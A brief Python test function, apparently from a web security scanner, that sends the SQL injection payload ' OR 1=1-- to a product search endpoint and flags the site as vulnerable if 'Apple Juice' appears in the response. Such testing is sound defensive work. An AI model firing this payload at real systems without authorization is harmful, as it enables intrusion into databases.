import requests


def test_sql_injection(base_url):
    print("[*] Testing SQL Injection on /rest/products/search")

    payload = "' OR 1=1--"
    endpoint = f"{base_url}/rest/products/search"
    response = requests.get(endpoint, params={"q": payload})

    if "Apple Juice" in response.text:
        print("\ud83d\udea8 SQL Injection possible!")
        return {"vulnerable": True, "payload": payload}
    else:
        print("\u2705 Not vulnerable to SQL Injection.")
        return {"vulnerable": False}
